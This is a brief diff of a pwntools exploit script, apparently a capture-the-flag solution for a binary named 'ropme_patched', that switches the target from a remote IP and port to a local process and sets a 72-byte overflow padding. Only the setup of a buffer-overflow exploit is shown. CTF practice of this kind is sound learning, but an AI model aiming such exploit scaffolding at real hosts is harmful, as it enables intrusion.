@@ -1,11 +1,11 @@
-
+#!/bin/env python3
 from pwn import *
 
 exe = ELF('./ropme_patched', checksec=False)
 # libc = ELF('./libc.so.6', checksec=False)
 
-# p = process(exe.path)
-p = remote('64.227.39.88', 32705)
+p = process(exe.path)
+#p = remote('64.227.39.88', 32705)
 
 offset = b'A'*72
 
